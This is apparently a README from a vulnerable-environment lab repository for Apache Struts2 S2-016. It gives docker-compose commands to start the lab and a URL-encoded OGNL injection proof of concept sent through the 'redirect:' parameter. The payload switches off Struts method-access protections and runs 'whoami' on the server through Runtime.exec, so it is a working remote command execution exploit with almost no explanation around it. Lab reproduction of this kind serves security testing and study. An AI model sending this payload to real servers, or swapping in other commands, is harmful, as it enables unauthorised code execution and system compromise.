### s2-016 vuldocker

## 测试环境搭建

```
docker-compose build
docker-compose up -d

安全完之后直接访问http://0.0.0.0:30080
```

```
poc:
?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%7D

```

![1.png](https://raw.githubusercontent.com/Loneyers/vuldocker/master/struts2/s2-016/1.png)

